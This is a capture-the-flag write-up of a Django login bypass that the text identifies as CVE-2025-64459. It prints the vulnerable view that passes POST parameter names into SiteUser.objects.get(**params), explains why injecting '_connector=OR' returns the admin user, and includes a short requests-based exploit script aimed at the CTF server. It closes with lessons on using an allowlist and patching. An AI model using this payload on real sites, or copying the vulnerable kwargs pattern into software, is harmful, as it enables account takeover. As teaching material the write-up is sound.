# ORMT Challenge 2

WRITEUP: ORMT Challenge 2 (SK-CERT CTF)

Flag: SK-CERT{cve_2025_64459_c0nn3ct0r_1nj3ct10n}


CHALLENGE OVERVIEW
------------------
A Django 5.2.7 bookstore application with two endpoints: /login and /signup.
The login view passes sanitized POST parameter NAMES directly into
SiteUser.objects.get(**params), which is the classic ORM parameter injection
vulnerability. A sanitize() function is meant to block ORM lookup traversal.

The goal: log in as the admin user (role='admin') to get the flag.
Admin credentials are randomly generated 20-char username + 32-char password.


THE VULNERABLE CODE
-------------------
def sanitize(param):
    while param.find('__') != -1:
        param = param.replace('__', '_')
    return param

def siteuser_login(request):
    ...
    params = {}
    for param in request.POST:
        params[sanitize(param)] = request.POST[param]
    if {'password', 'username'}.intersection(params.keys()) != {'password', 'username'}:
        return HttpResponseServerError('Password and username required')
    user = SiteUser.objects.get(**params)
    if user.role == 'admin':
        return render(..., {'message': 'SK-CERT{...}'})  # FLAG


THE DEFENSE (AND WHY IT FAILS)
-------------------------------
sanitize() strips double underscores (__) to prevent ORM traversal lookups
like password__startswith=a. This is correct — no string manipulation can
produce __ in the output of this sanitize function (it's provably unbypassable
for that purpose).

However, the defense is incomplete. Django's Q object, which underpins all
ORM filtering, accepts two internal control parameters that use SINGLE underscores:

  _connector  — controls AND/OR logic between conditions (values: 'AND', 'OR')
  _negated    — boolean flag that negates the entire query

sanitize('_connector') = '_connector'   ← single underscore, unchanged!
sanitize('_negated')   = '_negated'     ← single underscore, unchanged!

This is CVE-2025-64459, a critical Django vulnerability affecting all Django
versions before 5.2.8 (and corresponding 4.2 / 5.1 patch releases).


THE EXPLOIT
-----------
Normally, the query is:
  WHERE username = 'x' AND password = 'x' AND role = 'admin'
  → DoesNotExist (admin's credentials are random, not 'x')

By injecting _connector=OR, the query becomes:
  WHERE username = 'x' OR password = 'x' OR role = 'admin'
  → Admin satisfies role = 'admin' → admin user is returned → FLAG

The key is using impossible values for username and password to ensure
ONLY the admin user matches the OR conditions (any real credential value
in username= or password= might accidentally match another user):

POST body:
  username=IMPOSSIBLE_ZZZ&password=IMPOSSIBLE_ZZZ&role=admin&_connector=OR

Django ORM receives:
  SiteUser.objects.get(
      username='IMPOSSIBLE_ZZZ',
      password='IMPOSSIBLE_ZZZ',
      role='admin',
      _connector='OR'
  )

Generated SQL (approximately):
  SELECT * FROM main_siteuser
  WHERE username = 'IMPOSSIBLE_ZZZ'
     OR password = 'IMPOSSIBLE_ZZZ'
     OR role = 'admin'

Since only one user has role='admin', .get() returns exactly that user.
user.role == 'admin' → flag is returned.


EXPLOIT SCRIPT
--------------
import requests

TARGET = "http://exp.cybergame.sk:7002"

r = requests.post(f"{TARGET}/login", data={
    "username": "IMPOSSIBLE_ZZZ",
    "password": "IMPOSSIBLE_ZZZ",
    "role": "admin",
    "_connector": "OR",
})
print(r.text)  # Contains SK-CERT{...}


LESSONS LEARNED
---------------
1. Filtering POST parameter NAMES before passing to ORM is insufficient.
   You must also validate that the resulting kwargs are an allowed set.

2. Django's Q object internals (_connector, _negated) leak into .get()/**kwargs.
   This is the core of CVE-2025-64459.

3. The correct fix is an allowlist: only permit known-safe field names
   (e.g., {'username', 'password'}) rather than trying to sanitize arbitrary input.

4. Version pinning matters: Django 5.2.7 is vulnerable; 5.2.8 patches this CVE.

================================================================
